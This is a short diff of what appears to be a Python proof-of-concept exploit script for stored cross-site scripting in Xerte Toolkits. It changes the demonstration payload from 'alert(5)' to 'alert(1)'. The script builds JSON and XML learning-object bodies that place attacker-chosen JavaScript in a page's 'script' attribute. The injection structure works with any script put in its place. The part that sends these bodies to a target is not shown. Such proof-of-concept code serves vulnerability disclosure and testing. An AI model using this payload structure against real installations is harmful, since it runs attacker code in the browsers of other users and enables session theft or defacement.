@@ -97,7 +97,7 @@ def main():
         help = "Full URL to application. Ex: http://target.com/xertetoolkits")
     args = parser.parse_args()
 
-    payload = "alert(5)"
+    payload = "alert(1)"
 
     jsonPayload = """{"attributes":{"nodeName":"learningObject","editorVersion":"3","targetFolder":"Nottingham","name":"XSS Title","language":"en-GB","navigation":"Linear","textSize":"12","theme":"xot1","themeIcons":"false","displayMode":"fill window","responsive":"true"},"children":{"0":{"attributes":{"nodeName":"title","linkID":"PG1774302902664","name":"XSS Page","text":"","size":"30","titleVAlign":"200","titleHAlign":"center","startBtnTxt":"Start","script":"// JavaScript / jQuery\n""" + payload + """","run":"first"}}}}"""
     xmlPayload = """<?xml version="1.0"?><learningObject editorVersion="3" targetFolder="Nottingham" name="XSS2 Title" language="en-GB" navigation="Linear" textSize="12" theme="xot1" themeIcons="false" displayMode="fill window" responsive="true"><title linkID="PG1774302902664" name="XSS 2 Page 1" text="" size="30" titleVAlign="200" titleHAlign="center" startBtnTxt="Start" script="// JavaScript / jQuery&#10;""" + payload + """" run="first"/></learningObject>"""
